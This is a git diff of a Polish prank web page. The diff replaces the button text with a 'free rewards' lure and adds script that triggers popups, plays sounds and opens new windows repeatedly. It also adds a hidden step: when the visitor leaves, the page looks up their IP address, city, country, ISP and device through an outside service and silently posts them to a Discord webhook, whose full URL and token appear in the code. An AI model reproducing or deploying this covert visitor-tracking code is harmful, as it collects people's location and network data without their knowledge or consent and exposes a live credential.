@@ -1,11 +1,12 @@
 <!DOCTYPE html>
 <html lang="pl">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>🟥 Antek nadchodzi...</title>
-  <link rel="icon" href="favicon1.ico" type="image/x-icon">
-  <link rel="stylesheet" href="style.css">
+  <link rel="icon" href="favicon1.ico" type="image/x-icon" />
+  <link rel="stylesheet" href="style.css" />
+  <script src="https://unpkg.com/platform/platform.js"></script>
   <style>
     body {
       background-color: black;
@@ -38,12 +39,24 @@
     }
 
     @keyframes shake {
-      0% { transform: translate(0px, 0px); }
-      20% { transform: translate(-10px, 5px); }
-      40% { transform: translate(10px, -5px); }
-      60% { transform: translate(-10px, 5px); }
-      80% { transform: translate(10px, -5px); }
-      100% { transform: translate(0px, 0px); }
+      0% {
+        transform: translate(0px, 0px);
+      }
+      20% {
+        transform: translate(-10px, 5px);
+      }
+      40% {
+        transform: translate(10px, -5px);
+      }
+      60% {
+        transform: translate(-10px, 5px);
+      }
+      80% {
+        transform: translate(10px, -5px);
+      }
+      100% {
+        transform: translate(0px, 0px);
+      }
     }
 
     .random-img {
@@ -55,16 +68,176 @@
     }
 
     @keyframes float {
-      0% { transform: translateY(0); }
-      50% { transform: translateY(-10px); }
-      100% { transform: translateY(0); }
+      0% {
+        transform: translateY(0);
+      }
+      50% {
+        transform: translateY(-10px);
+      }
+      100% {
+        transform: translateY(0);
+      }
     }
   </style>
 </head>
 <body>
-  <h1>Witaj w królestwie Antka</h1>
-  <button id="crazyButton">Kliknij, jeśli się odważysz</button>
+  <h1>Cześć</h1>
+  <button id="crazyButton">Kliknij we mnie po darmowe nagrody!</button>
   <div id="message"></div>
+
+  <p>🔁 Odwiedziłeś tę stronę <strong id="visitCount">...</strong> razy.</p>
+  <h3>📜 Ostatnia wizyta:</h3>
+  <pre id="lastVisit">Brak danych</pre>
+
+  <script>
+    const startTime = Date.now();
+    const webhookUrl = "https://discord.com/api/webhooks/1373725358951764118/wwpbThoUoNmzFQ4mlRa6Fz_LMLO6RrvlaL1Us3vxDC8nJtfVHMjJfxm28SxMU-t5MIt1"; // 🔁 Wklej swój prawdziwy Webhook Discorda
+
+    // Licznik odwiedzin - aktualizujemy od razu
+    const visits = parseInt(localStorage.getItem("visitCount") || "0") + 1;
+    localStorage.setItem("visitCount", visits);
+    document.getElementById("visitCount").innerText = visits;
+
+    // Zapis lokalny historii
+    function saveVisitLocally(entry) {
+      const history = JSON.parse(localStorage.getItem("visitHistory") || "[]");
+      history.push(entry);
+      localStorage.setItem("visitHistory", JSON.stringify(history, null, 2));
+    }
+
+    // Wyświetl ostatnią wizytę
+    function showLastVisit() {
+      const history = JSON.parse(localStorage.getItem("visitHistory") || "[]");
+      if (history.length > 0) {
+        const last = history[history.length - 1];
+        document.getElementById("lastVisit").innerText = JSON.stringify(last, null, 2);
+      }
+    }
+
+    showLastVisit();
+
+    // Flaga, czy Antek jest aktywny (po kliknięciu)
+    let antekActive = false;
+
+    // Funkcja do inicjalizacji „Antka”
+    function startAntek() {
+      if (antekActive) return; // zabezpieczenie - nie uruchamiaj dwa razy
+      antekActive = true;
+
+      // Podłącz event beforeunload (żeby wysłać dane dopiero gdy Antek działa)
+      window.addEventListener("beforeunload", () => {
+        const duration = Math.round((Date.now() - startTime) / 1000);
+
+        fetch("https://ipapi.co/json/")
+          .then((res) => res.json())
+          .then((data) => {
+            const ip = data.ip || "Brak IP";
+            const city = data.city || "Nieznane miasto";
+            const country = data.country_name || "Nieznany kraj";
+            const org = data.org || "Nieznany ISP";
+            const device = platform.description || "Nieznane urządzenie";
+            const now = new Date().toLocaleString();
+
+            const content = `📥 **Nowe wejście na stronę**
+🕒 Data: ${now}
+🌐 IP: \`${ip}\`
+🏙️ Lokalizacja: ${city}, ${country}
+📶 Dostawca: ${org}
+🖥️ Urządzenie: ${device}
+🔁 Odwiedzin: ${visits}
+⏱️ Czas na stronie: ${duration} sekund`;
+
+            // Wyślij do Discorda
+            fetch(webhookUrl, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ content }),
+            });
+
+            // Zapisz lokalnie
+            saveVisitLocally({
+              date: now,
+              ip,
+              location: `${city}, ${country}`,
+              isp: org,
+              device,
+              duration,
+              visits,
+            });
+          });
+      });
+
+      // Tutaj możesz też podpiąć resztę swojego skryptu „antekowego” - np. dźwięki, popupy itd.
+      // Poniżej przykład minimalnego popupu po kliknięciu:
+      const button = document.getElementById("crazyButton");
+      const message = document.getElementById("message");
+
+      // Przygotuj dźwięki
+      const sound = [
+        new Audio("stracilas-cnote_R1qiG8j.mp3"),
+        new Audio("illegal-polish-content.mp3"),
+        new Audio("polish-toilet-refrain.mp3"),
+      ];
+
+      button.addEventListener("click", () => {
+        // Odtwarzaj wszystkie dźwięki naraz
+        sound.forEach((s) => {
+          s.currentTime = 0;
+          s.play();
+        });
+
+        // Losowa wiadomość
+        const texts = [
+          "To był błąd...",
+          "Dlaczego kliknąłeś?",
+          "Teraz już za późno.",
+          "Zostałeś oznaczony.",
+          "Antek obserwuje.",
+        ];
+        const randomText = texts[Math.floor(Math.random() * texts.length)];
+        message.textContent = randomText;
+
+        // Migające tło i drganie
+        document.body.style.backgroundColor = "red";
+        document.body.classList.add("shake");
+        setTimeout(() => {
+          document.body.style.backgroundColor = "#000";
+          document.body.classList.remove("shake");
+        }, 400);
+
+        // Popupy
+        setTimeout(() => {
+          alert("Hej! To nie był najlepszy pomysł.");
+        }, 500);
+
+        setTimeout(() => {
+          const response = confirm("Czy naprawdę myślisz, że to już koniec?");
+          if (response) {
+            prompt("Podaj swoje imię... Antek chce wiedzieć.");
+          } else {
+            alert("Antek się zawiódł...");
+          }
+        }, 1500);
+
+        // Otwieraj 4 strony co 5 sekund
+        let count = 0;
+        const urls = [
+          "https://example.com/1",
+          "https://example.com/2",
+          "https://example.com/3",
+          "https://example.com/4",
+        ];
+        const intervalId = setInterval(() => {
+          window.open(urls[count % urls.length], "_blank");
+          count++;
+          if (count > 15) clearInterval(intervalId);
+        }, 5000);
+      });
+    }
+
+    // Uruchamiamy Antek dopiero po kliknięciu w przycisk
+    document.getElementById("crazyButton").addEventListener("click", startAntek);
+  </script>
 
   <script src="script.js"></script>
 </body>
